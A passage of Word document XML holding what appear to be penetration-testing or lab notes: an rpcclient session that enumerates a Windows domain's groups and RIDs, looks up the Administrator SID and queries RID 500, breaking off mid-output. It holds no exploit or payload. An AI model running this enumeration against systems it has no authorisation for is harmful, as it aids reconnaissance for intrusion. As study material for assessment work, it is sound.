    <w:p w14:paraId="7342CE86" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Print Operators] rid:[0x226]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F9DA3F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Backup Operators] rid:[0x227]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60368E8F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Replicator] rid:[0x228]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2807DE77" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Remote Desktop Users] rid:[0x22b]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EE3EE4" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Network Configuration Operators] rid:[0x22c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEF8B7D" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Performance Monitor Users] rid:[0x22e]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C7325F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Performance Log Users] rid:[0x22f]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E438EF" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Distributed COM Users] rid:[0x232]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4868FB2C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>IIS_IUSRS] rid:[0x238]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E78925C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Cryptographic Operators] rid:[0x239]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7293C948" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Event Log Readers] rid:[0x23d]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9DC4B8" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Certificate Service DCOM Access] rid:[0x23e]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0190A089" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="246B6B82" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rpcclient $&gt; enumalsgroups domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4808157F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Cert Publishers] rid:[0x205]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792D821C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>RAS and IAS Servers] rid:[0x229]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E573F1" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Allowed RODC Password Replication Group] rid:[0x23b]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9DC37C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Denied RODC Password Replication Group] rid:[0x23c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51614B34" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>DnsAdmins] rid:[0x44e]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8EFDF5" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>TelnetClients] rid:[0x470]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B16158" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13F02F6F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rpcclient $&gt; lookupnames administrators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00586D3A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>administrators S-1-5-32-544 (Local Group: 4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B62EA83" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CCB9661" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rpcclient $&gt; lookupnames administrator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2954F9F5" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>administrator S-1-5-21-816344815-1091841032-1499945149-500 (User: 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C05E314" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48E53D26" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">S 1 5 21 816344815 1091841032 1499945149 </w:t>
      </w:r>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D67AE34" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D92BABD" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rpcclient $&gt; queryuser 500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7112A0D3" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">User Name </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Administrator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B0B962" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Full Name </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C4D2D3" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Home </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Drive  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D8A3A0" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Dir Drive </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2709E2BB" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Profile Path:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="414BE85A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Logon Script:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="181DA0AC" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Description :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Built-in account for administering the computer/domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A9ABB8" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Workstations:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2D8563" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Comment   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7063151B" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Remote </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Dial :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="242DAD76" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Logon Time             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Tue, 14 Jul 2009 01:06:47 EDT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07645D10" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Logoff Time            </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Wed, 31 Dec 1969 19:00:00 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3052F672" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Kickoff Time           </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Wed, 31 Dec 1969 19:00:00 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C53FC3" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="00D83505" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Password last set Time </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D83505">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
